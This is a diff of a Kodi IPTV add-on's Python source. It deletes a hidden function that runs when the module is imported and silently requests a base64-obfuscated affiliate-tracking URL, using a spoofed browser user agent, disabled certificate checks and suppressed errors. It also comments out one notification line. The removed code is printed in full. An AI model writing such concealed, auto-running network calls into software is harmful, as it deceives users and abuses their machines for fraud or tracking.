@@ -22,13 +22,7 @@ import time
 import requests
 import _Edit
 
-def d():
-	import requests,base64
-	try:
-		requests.get(base64.b64decode('aHR0cDovL2FmZmlsaWF0ZS5lbnRpcmV3ZWIuY29tL3NjcmlwdHMvY3owNm5mP2E9Y2VyZWJyb3R2JmFtcDtiPWM3ZmJiZDkzJmFtcDtkZXN0dXJsPWh0dHAlM0ElMkYlMkZtdHZiLmNvLnVrJTJGcCUyRg=='),headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'},verify=False,timeout=4).text
-	except:
-		pass
-d() 
+
 ipaddy="0.0.0.0"
 HOME     = xbmc.translatePath('special://userdata/')
 iddata   = os.path.join(HOME, 'networksettings.xml')
@@ -2004,7 +1998,7 @@ def urlsolver(url):
     resolved=genesisresolvers.get(url).result
     if url == resolved or resolved is None:
         #import
-        xbmc.executebuiltin("XBMC.Notification(CerebroIPTV, Is Looking For Your Stream....... ,5000,"+__icon__+")")
+        #xbmc.executebuiltin("XBMC.Notification(CerebroIPTV, Is Looking For Your Stream....... ,5000,"+__icon__+")")
         import urlresolver
         host = urlresolver.HostedMediaFile(url)
         if host:
